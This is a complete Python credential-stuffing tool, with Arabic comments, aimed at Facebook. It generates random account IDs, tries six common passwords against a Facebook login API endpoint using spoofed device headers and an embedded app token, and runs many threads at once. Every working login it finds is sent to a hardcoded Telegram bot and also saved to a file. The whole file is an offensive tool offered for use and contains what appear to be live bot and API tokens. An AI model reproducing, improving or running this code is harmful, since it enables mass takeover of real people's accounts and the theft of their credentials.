import os, sys, re, time, uuid, hashlib, random, string, json
import requests
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tre
from datetime import datetime

# ========== إعدادات ثابتة ==========
TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"  # توكن البوت (يمكن تغييره)
CHAT_ID = "7075895496"  # آيدي التلغرام (يمكن تغييره)

# ========== دوال مساعدة ==========
def clear():
    os.system('clear' if 'win' not in sys.platform else 'cls')

def linex():
    print('\033[92;1m' + '═' * 50 + '\033[0m')

def banner():
    clear()
    print("""\033[1;32m
    ╔══════════════════════════════════════════╗
    ║            𝙊 𝙈 𝘼 𝙍     ║
    ║        Developer: @ln_2008           ║
    ╚══════════════════════════════════════════╝
    \033[0m""")

# ========== توليد User-Agent ==========
def windows():
    versions = [
        f"Mozilla/5.0 (Windows NT {random.choice([10,11])}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.{random.randint(6000,7000)}.{random.randint(50,200)} Safari/537.36",
        f"Mozilla/5.0 (Windows NT {random.choice([10,11])}.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.{random.randint(6000,7000)}.{random.randint(50,200)} Safari/537.36",
    ]
    return random.choice(versions)

# ========== تقدير سنة إنشاء الحساب ==========
def creation_year(uid):
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        elif uid_str.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        elif uid_str.startswith('100001'):
            return '2010'
        elif uid_str.startswith(('100002', '100003')):
            return '2011'
        elif uid_str.startswith('100004'):
            return '2012'
        elif uid_str.startswith(('100005', '100006')):
            return '2013'
        elif uid_str.startswith(('100007', '100008')):
            return '2014'
        elif uid_str.startswith('100009'):
            return '2015'
        elif uid_str.startswith('10001'):
            return '2016'
        elif uid_str.startswith('10002'):
            return '2017'
        elif uid_str.startswith('10003'):
            return '2018'
        elif uid_str.startswith('10004'):
            return '2019'
        elif uid_str.startswith('10005'):
            return '2020'
        elif uid_str.startswith('10006'):
            return '2021'
        elif uid_str.startswith(('10007', '10008')):
            return '2022'
        elif uid_str.startswith('10009'):
            return '2023'
    elif len(uid_str) in (9,10):
        return '2008'
    elif len(uid_str) == 8:
        return '2007'
    elif len(uid_str) == 7:
        return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'):
        return '2024'
    return ''

# ========== محاولة تسجيل الدخول (الطريقة الرئيسية) ==========
def login_attempt(uid):
    global loop
    session = requests.Session()
    passwords = ['123456', '1234567', '12345678', '123456789', 'password', '1234567890']
    try:
        sys.stdout.write(f"\r\033[1;37m[\033[1;36m{loop}\033[1;37m] Trying {uid}...")
        sys.stdout.flush()
        for pw in passwords:
            headers = {
                'User-Agent': windows(),
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'Origin': 'https://www.facebook.com',
                'Referer': 'https://www.facebook.com/',
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            resp = session.post('https://graph.facebook.com/v21.0/auth/login', data=data, headers=headers, allow_redirects=False)
            try:
                res = resp.json()
            except:
                continue
            if 'session_key' in res:
                uid_url = f'https://www.facebook.com/profile.php?id={uid}'
                success_msg = f"[✓] {uid} | PASS: {pw} | YEAR: {creation_year(uid)}"
                print(f"\r{success_msg}")
                # إرسال إلى تلغرام
                telegram_msg = f"📦 Facebook Clone\nUID: {uid}\nPASS: {pw}\nYear: {creation_year(uid)}\nLink: {uid_url}"
                requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={telegram_msg}")
                with open('/sdcard/SHMRI-OLD-OK.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                ok.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                # نجاح جزئي أو checkpoint
                uid_url = f'https://www.facebook.com/profile.php?id={uid}'
                success_msg = f"[✓] {uid} | PASS: {pw} | YEAR: {creation_year(uid)} (Checkpoint)"
                print(f"\r{success_msg}")
                telegram_msg = f"📦 Facebook Clone (CP)\nUID: {uid}\nPASS: {pw}\nYear: {creation_year(uid)}\nLink: {uid_url}"
                requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={telegram_msg}")
                with open('/sdcard/SHMRI-OLD-OK.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                ok.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(1)

# ========== القوائم الرئيسية ==========
def main_menu():
    banner()
    linex()
    print("    1) Old Clone (All Series)")
    print("    2) 100003/100004 Method")
    print("    3) 2009-2010 Method")
    print("    4) Hunt 2001-2006 Accounts")   # ⬅️ الخيار الجديد
    linex()
    choice = input("    Choose: ")
    if choice == '1':
        old_clone()
    elif choice == '2':
        method_100003()
    elif choice == '3':
        old_tree()
    elif choice == '4':
        hunt_2001_2006()
    else:
        print("Invalid option.")
        time.sleep(2)
        main_menu()

def old_clone():
    user = []
    banner()
    limit = int(input("How many UIDs? (e.g., 50000): "))
    start_prefix = '100003'
    for _ in range(limit):
        uid = start_prefix + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    with tre(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_attempt, uid)

def method_100003():
    user = []
    banner()
    limit = int(input("How many UIDs?: "))
    prefixes = ['100003', '100004']
    for _ in range(limit):
        prefix = random.choice(prefixes)
        uid = prefix + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    with tre(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_attempt, uid)

def old_tree():
    user = []
    banner()
    limit = int(input("How many UIDs?: "))
    prefix = '1000004'
    for _ in range(limit):
        uid = prefix + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    with tre(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_attempt, uid)

# ========== صيد حسابات 2001-2006 ==========
def hunt_2001_2006():
    """
    توليد UIDs قصيرة (5-8 أرقام) ممثلة للحسابات القديمة جداً
    وتجربة كلمات مرور شائعة.
    """
    user = []
    banner()
    limit = int(input("How many UIDs to hunt? (e.g., 100000): "))
    print("Generating UIDs from ancient era (2001-2006)...")
    for _ in range(limit):
        # نطاقات الطول: 5 أرقام (نادر) إلى 8 أرقام (2007)
        # سنختار طول عشوائي بين 5 و 8 ونولد رقمًا عشوائيًا بهذا الطول
        length = random.randint(6, 8)  # 6-8 أرقام، لأن الأقل نادر
        if length == 6:
            uid = str(random.randint(100000, 999999))
        elif length == 7:
            uid = str(random.randint(1000000, 9999999))
        elif length == 8:
            uid = str(random.randint(10000000, 99999999))
        else:
            uid = str(random.randint(10000, 99999))  # 5 أرقام (نادر)
        user.append(uid)
    with tre(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_attempt, uid)

# ========== بدء البرنامج ==========
if __name__ == '__main__':
    loop = 0
    ok = []
    main_menu()
